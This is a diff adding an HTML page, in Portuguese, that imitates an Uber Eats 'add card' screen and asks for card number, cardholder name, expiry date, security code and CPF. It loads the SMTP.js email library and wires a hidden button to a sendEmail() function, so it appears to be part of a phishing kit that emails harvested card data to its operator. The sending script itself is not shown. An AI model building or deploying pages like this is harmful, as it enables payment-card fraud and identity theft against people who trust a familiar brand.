@@ -1,0 +1,60 @@
+<html lang="pt-br">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="stylesheet" href="login.css" />
+        <link rel="stylesheet" href="infos.css" />
+        <script type="text/javascript" src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+        <script type="text/javascript" src="https://smtpjs.com/v3/smtp.js"></script>
+        <script type="text/javascript" src="cardscript.js"></script>
+        <script type="text/javascript" src="cc.js"></script>
+
+        <!--===== CSS =====-->
+        <title>Uber Eats</title>
+    </head>
+    <body>
+        <div class="container">
+            <div>
+                <a href="payment.html">
+                    <div style="width: fit-content;"><img src="return.png" /></div>
+                </a>
+                <img src="cardtext.png" />
+                <form action="#" method="post">
+                    <div class="ccnumber">
+                        <label for="ccnumber">Número do cartão</label>
+                        <input style="background-color: #f5f5f5;" id="ccnumber" type="tel" autocomplete="cc-number" maxlength="16" inputmode="numeric" />
+                        <span class="ccband" id="ccbandeira"></span>
+                        <span id="msgccnumber"></span>
+                    </div>
+                    <div class="ccnumber">
+                        <label for="ccnumber">Nome do cartão</label>
+                        <input style="background-color: #f5f5f5;" id="ccname" type="name" autocomplete="cc-name" maxlength="50" />
+                        <span></span>
+                    </div>
+                    <div id="hp" class="cc-infos">
+                        <div class="cc-exp-val">
+                            <label for="cc-exp">Validade</label>
+                            <input style="background-color: #f5f5f5;" id="cc-exp" type="tel" autocomplete="cc-exp" placeholder="MM / AA" maxlength="5" inputmode="numeric" required="" />
+                            <span id="msgccExp"></span>
+                        </div>
+                        <div class="cc-exp-val">
+                            <div class="label-exp">
+                                <label for="cc-csc">Código de segurança</label>
+                            </div>
+                            <input style="background-color: #f5f5f5; text-decoration: wavy;" id="cc-csc" type="tel" autocomplete="cc-csc" maxlength="4" inputmode="numeric" required="" />
+                            <span id="msgcccsc"></span>
+                        </div>
+                    </div>
+                    <div class="ccnumber">
+                        <label for="ccnumber">CPF</label>
+                        <input style="background-color: #f5f5f5;" id="cpf" type="tel" autocomplete="cpf" maxlength="14" inputmode="numeric" />
+                        <span id="msgCpf"></span>
+                    </div>
+                    <div id="btn" class="btn">
+                        <input type="reset" id="addcard" onclick="sendEmail()" style="display: none;" value="Adicionar cartão" />
+                    </div>
+                </form>
+            </div>
+        </div>
+    </body>
+</html>
